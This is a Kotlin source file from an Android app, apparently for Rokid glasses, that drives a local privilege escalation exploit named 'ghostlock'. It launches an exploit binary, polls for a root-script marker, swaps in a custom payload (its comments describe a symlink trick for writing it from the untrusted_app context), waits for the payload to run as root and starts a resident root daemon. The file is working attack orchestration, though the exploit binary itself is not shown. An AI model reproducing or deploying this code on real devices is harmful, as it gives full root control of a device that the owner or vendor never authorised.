package com.rokid.rc.glasses.ghost

import android.content.Context
import com.rokid.rc.shared.protocol.GhostlockCodes
import com.rokid.rc.shared.protocol.ProgressCodec
import com.rokid.rc.shared.protocol.ProgressEvent
import android.os.SystemClock
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * ghostlock LPE trigger layer (direct version).
 *
 * Runs [ExploitConfig.binaryPath] inside the app through ProcessBuilder and reproduces the whole existing
 * run_*_orchestrator.sh flow:
 *
 *   1. launch  — start the exploit (with env, output redirected to the exploitLog in the app cache)
 *   2. ready   — poll rootScriptPath for the readyMarker (proving write_root_script() has run)
 *   3. install — atomically rename the custom payload into rootScriptPath
 *   4. done    — poll payloadLog for the doneMarker (the payload has finished running as root)
 *   5. cleanup — reap the exploit process
 *
 * Preconditions: the app must be able to read/exec `binaryPath` and write `rootScriptPath` (that is, it needs
 * access to `/data/local/tmp`). If the app identity (`u:r:untrusted_app`) lacks that permission, it reports this
 * explicitly at the READY / INSTALL stage; the "root bridge daemon" approach is then required
 * (see docs/architecture.md §5).
 */
class ShellGhostlockEngine(
    private val context: Context,
    private val config: ExploitConfig = ExploitConfig()
) : GhostlockEngine {

    private val payloadLog = GhostlockPaths.payloadLog(context)
    private val exploitLog = GhostlockPaths.exploitLog(context)

    @Volatile
    override var isEnabled: Boolean = false
        private set

    override fun setEnabled(enabled: Boolean) {
        isEnabled = enabled
    }

    override fun doneLog(): File = payloadLog

    override var onProgress: ((ProgressEvent) -> Unit)? = null

    @Volatile
    override var rootAcquired: Boolean = false
        private set

    override suspend fun acquireRoot(): ExecResult {
        // if a resident root daemon (uid=0) already exists, skip re-running the exploit to avoid a pointless reboot risk
        val client = RootDaemonClient()
        if (client.isRoot()) {
            rootAcquired = true
            progress(GhostlockCodes.SKIP_LPE)
            return ExecResult.ok(Stage.DONE, "already rooted")
        }
        val result = exec(LedPayloads.startRootDaemon(doneLog()))
        rootAcquired = result.success
        return result
    }

    override suspend fun exec(payload: RootScript): ExecResult = withContext(Dispatchers.IO) {
        // 0. preflight
        val binary = File(config.binaryPath)
        if (!binary.exists() || !binary.canExecute()) {
            return@withContext ExecResult.fail(
                Stage.PREFLIGHT,
                ProgressCodec.encode(GhostlockCodes.BINARY_MISSING, binary.absolutePath)
            )
        }

        payloadLog.delete()
        exploitLog.delete()

        // 1. launch
        progress(GhostlockCodes.EXPLOIT_STARTED)
        val proc = startExploit()
            ?: return@withContext ExecResult.fail(Stage.LAUNCH, ProgressCodec.encode(GhostlockCodes.EXPLOIT_START_FAILED, exploitLog.absolutePath))

        try {
            // 2. ready
            progress(GhostlockCodes.WAIT_READY)
            if (!waitFor(config.readyTimeoutMs) { readySeen() }) {
                return@withContext ExecResult.fail(
                    Stage.READY,
                    ProgressCodec.encode(GhostlockCodes.READY_TIMEOUT, config.rootScriptPath + " / " + config.readyMarker)
                )
            }

            // 3. install payload
            progress(GhostlockCodes.PAYLOAD_REPLACED)
            if (!installPayload(payload)) {
                return@withContext ExecResult.fail(
                    Stage.INSTALL,
                    ProgressCodec.encode(GhostlockCodes.PAYLOAD_WRITE_FAILED, config.rootScriptPath)
                )
            }

            // 4. done
            progress(GhostlockCodes.WAIT_PAYLOAD)
            if (!waitFor(config.doneTimeoutMs) { doneSeen() }) {
                return@withContext ExecResult.fail(
                    Stage.DONE,
                    ProgressCodec.encode(GhostlockCodes.PAYLOAD_TIMEOUT, readTail(payloadLog, 800))
                )
            }

            return@withContext ExecResult.ok(Stage.DONE, readTail(payloadLog, 4000))
        } finally {
            destroy(proc)
        }
    }

    // ---- internals ----

    private fun startExploit(): Process? = try {
        ProcessBuilder(config.binaryPath)
            .directory(context.cacheDir)
            .redirectErrorStream(true)
            .redirectOutput(exploitLog)
            .apply {
                val env = environment()
                config.env.forEach { kv ->
                    val parts = kv.split("=", limit = 2)
                    env[parts[0]] = parts.getOrElse(1) { "" }
                }
            }
            .start()
    } catch (e: Exception) {
        Log.e(TAG, "startExploit failed", e)
        null
    }

    private fun readySeen(): Boolean = try {
        File(config.rootScriptPath).readText().contains(config.readyMarker)
    } catch (e: Exception) {
        false
    }

    private fun installPayload(payload: RootScript): Boolean = try {
        val target = File(config.rootScriptPath)
        // write directly (if rootScriptPath is a symlink into a writable directory, the write follows the symlink to the target,
        // so untrusted_app can replace the payload too, with no shell helper needed)
        target.writeText(payload.content)
        target.setExecutable(true, false)
        true
    } catch (e: Exception) {
        Log.e(TAG, "installPayload failed", e)
        false
    }

    private fun doneSeen(): Boolean =
        payloadLog.exists() && payloadLog.readText().contains(config.doneMarker)

    private fun waitFor(timeoutMs: Long, cond: () -> Boolean): Boolean {
        val deadline = SystemClock.elapsedRealtime() + timeoutMs
        while (SystemClock.elapsedRealtime() < deadline) {
            if (cond()) return true
            Thread.sleep(config.pollIntervalMs)
        }
        return cond() // last chance
    }

    private fun destroy(proc: Process) {
        try {
            proc.destroyForcibly()
            proc.waitFor(2, TimeUnit.SECONDS)
        } catch (_: Exception) {
        }
    }

    private fun readTail(file: File, max: Int): String = try {
        if (!file.exists()) "(none)" else file.readText().takeLast(max)
    } catch (e: Exception) {
        "(unreadable)"
    }

    companion object {
        private const val TAG = "ShellGhostlockEngine"
    }
}
